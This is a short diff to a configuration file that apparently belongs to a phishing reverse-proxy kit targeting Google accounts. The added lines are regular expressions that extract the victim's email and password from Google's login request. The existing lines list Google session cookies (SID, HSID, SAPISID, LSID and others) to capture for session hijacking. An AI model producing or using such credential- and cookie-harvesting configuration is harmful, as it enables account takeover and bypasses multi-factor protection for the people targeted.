@@ -1,4 +1,6 @@
 [creds]
 email_arg=Email
 passwd_arg=Passwd
+email_arg_re=f.req:=\],"([^"]*)"\]$
+passwd_arg_re=f.req:=,\["([^"]*)",
 tokens=[{"domain":".google.com","cookies":["SID", "HSID", "SSID", "APISID", "SAPISID", "NID"]},{"domain":"accounts.google.com","cookies":["GAPS", "LSID"]}]
